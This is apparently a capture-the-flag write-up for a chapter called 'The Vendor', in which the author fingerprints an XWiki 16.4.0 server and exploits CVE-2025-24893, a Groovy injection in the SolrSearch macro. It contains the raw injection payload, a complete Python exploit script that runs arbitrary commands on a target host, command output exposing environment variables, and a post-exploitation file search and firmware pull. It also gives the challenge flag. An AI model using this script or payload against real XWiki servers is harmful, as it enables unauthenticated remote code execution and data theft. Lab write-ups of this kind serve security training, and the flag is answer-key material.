# Chapter 2: The Vendor

## Challenge

Hi, emergency troubleshooter,

recent studies suggest that the intense heat and hard labor of solar technicians often trigger strange, vivid dreams about the future of energetics. Over the past few days, technicians have woken up night after night with the same terrifying screams "Look, up in the sky! It’s a bird! It’s a plane! It’s Superman! Let’s roast it anyway!".

Find out what’s going on, we need our technicians to stay sane.

Stay grounded!

http://intro.falcon.powergrid.tcc/

Hint: Be sure you enter flag for correct chapter.
Hint: In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.
Hint: Chapter haiku will lead you.

Haiku:

```plain
Bits beneath the shell,
silent thief in circuits' sleep-
firmware leaves the nest.
```

http://thevendor.falcon.powergrid.tcc/

## TL;DR

Identified the target as **XWiki 16.4.0**, leveraged an unauthenticated Groovy injection in **SolrSearch macro** (CVE-2025-24893 / ZDI-24-1697) to execute commands, and retrieved the flag from the **`FLAG`** environment variable via `env`.

## Scope & Targets

- Target web: `http://thevendor.falcon.powergrid.tcc/xwiki/`
- Technology: XWiki
- Version (from REST): 16.4.0

## Identify the Platform & Version

```bash
# Query REST to get version
curl http://thevendor.falcon.powergrid.tcc/xwiki/rest/
```

```xml
<xwiki>
<link href="http://thevendor.falcon.powergrid.tcc/xwiki/rest/wikis" rel="http://www.xwiki.org/rel/wikis"/>
<link href="http://thevendor.falcon.powergrid.tcc/xwiki/rest/syntaxes" rel="http://www.xwiki.org/rel/syntaxes"/>
<link href="http://thevendor.falcon.powergrid.tcc/xwiki/rest/client" rel="http://www.xwiki.org/rel/client"/>
<version>16.4.0</version>
</xwiki>
```

**Note:** Version **16.4.0** maps to a recent unauthenticated RCE in SolrSearch macros.

## Vulnerability Recon & Initial Probe

Based on research, target **CVE-2025-24893** (a.k.a. ZDI-24-1697). A crafted payload inside the SolrSearch text parameter can execute Groovy code server-side.

First sanity check (arithmetic), returned HTTP 500 but confirms route handling the payload:

```plain
HTTP ERROR 500 javax.servlet.ServletException: Invalid URL [http://thevendor.falcon.powergrid.tcc/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}println(%22Exploit%20Successful!%20Result:%20%22%20+%20(23%20+%2019)){{/groovy}}{{/async}}] URI: /xwiki/bin/get/Main/SolrSearch STATUS: 500 MESSAGE: javax.servlet.ServletException: Invalid URL [http://thevendor.falcon.powergrid.tcc/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}println(%22Exploit%20Successful!%20Result:%20%22%20+%20(23%20+%2019)){{/groovy}}{{/async}}] SERVLET: action CAUSED BY: javax.servlet.ServletException: Invalid URL [http://thevendor.falcon.powergrid.tcc/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}println(%22Exploit%20Successful!%20Result:%20%22%20+%20(23%20+%2019)){{/groovy}}{{/async}}] CAUSED BY: org.xwiki.resource.CreateResourceReferenceException: Invalid URL
```

## Exploit Script

[exploit.py](exploit.py)

```python
#!/usr/bin/env python3
import argparse
import requests
import urllib.parse
import html
import xml.etree.ElementTree as ET
import re
import sys

def make_payload(cmd: str) -> str:
    '''
    Build the Groovy payload without using f-strings so we avoid brace escaping issues.
    Returns the raw payload (not URL-encoded).
    '''
    prefix = '}}}{{async async=false}}{{groovy}}println(Runtime.getRuntime().exec("'
    suffix = '").text){{/groovy}}{{/async}}'
    return prefix + cmd + suffix

def fetch_rss_xml(host: str, cmd: str, timeout: int = 10) -> str:
    payload = make_payload(cmd)
    encoded = urllib.parse.quote(payload, safe='')
    url = f"{host.rstrip('/')}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded}"
    headers = {"User-Agent": "exploit-script/1.0"}
    r = requests.get(url, headers=headers, timeout=timeout)
    r.raise_for_status()
    return r.text

def extract_xml_from_response(resp_text: str) -> str:
    esc_idx = resp_text.find("&lt;?xml")
    if esc_idx != -1:
        tail = resp_text[esc_idx:]
        unescaped = html.unescape(tail)
        idx = unescaped.find("<?xml")
        if idx != -1:
            return unescaped[idx:]
        return unescaped

    plain_idx = resp_text.find("<?xml")
    if plain_idx != -1:
        return resp_text[plain_idx:]

    raise RuntimeError("No XML prolog found in response")

def parse_rss_and_get_output(xml_str: str) -> str:
    xml_str = xml_str.split('}}}')[1].split("]</title>")[0].replace("<br/>", "\n")
    return xml_str

def run_exploit(host: str, cmd: str, timeout: int = 10) -> str:
    resp = fetch_rss_xml(host, cmd, timeout=timeout)
    xml = extract_xml_from_response(resp)
    out = parse_rss_and_get_output(xml)
    return out

def main():
    ap = argparse.ArgumentParser(description="Exploit CVE-2025-24893 (SolrSearch Groovy injection) and extract command output from RSS.")
    ap.add_argument("--host", required=True, help="Base URL, e.g. http://thevendor.falcon.powergrid.tcc")
    ap.add_argument("--cmd", default="id", help='Command to run on target (default: "id")')
    ap.add_argument("--timeout", type=int, default=100, help="HTTP timeout seconds")
    args = ap.parse_args()

    try:
        cmd = args.cmd
        result = run_exploit(args.host, cmd, timeout=args.timeout)
        if result:
            print(result)
        else:
            print("[!] No output captured", file=sys.stderr)
    except Exception as e:
        print("[!] Error:", str(e), file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

## Retrieve the Flag (Environment Variable)

```bash
python exploit.py --host http://thevendor.falcon.powergrid.tcc --cmd env
```

```plain
SUPERVISOR_GROUP_NAME=xwiki
HOSTNAME=52f39993436b
PWD=/opt/vendorwiki
JETTY_OPTS=jetty.http.host=127.0.0.1 jetty.http.port=8080 STOP.KEY=xwiki STOP.PORT=8079
HOME=/root
FLAG=FLAG{gwNd-0Klr-lsMW-YgZU}
SHLVL=0
LC_CTYPE=C.UTF-8
SUPERVISOR_PROCESS_NAME=xwiki
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/opt/vendorwiki
SUPERVISOR_ENABLED=1
```

## Flag

```plain
FLAG{gwNd-0Klr-lsMW-YgZU}
```

## Post-Exploitation Findings (Leads for Next Chapter)

```bash
python exploit.py --host http://thevendor.falcon.powergrid.tcc --cmd "find / -path /sys -prune -o -path /proc -prune -o -type f -newermt 2025-10-01 -print"
```

```plain
/data/firmware/index.html
/data/firmware/roostguard-firmware-0.9.bin
/data/firmware/prodsite3.lol
/data/firmware/prodsite2.lol
/data/firmware/thevendor-logo.png
/data/firmware/prodsite1.lol
```

These appear to be firmware-related assets and likely tie into the haiku ("firmware leaves the nest"). Keep them for the next chapter. We've downloaded all the files using base32 encoding (command `base32 /data/firmware/roostguard-firmware-0.9.bin`).
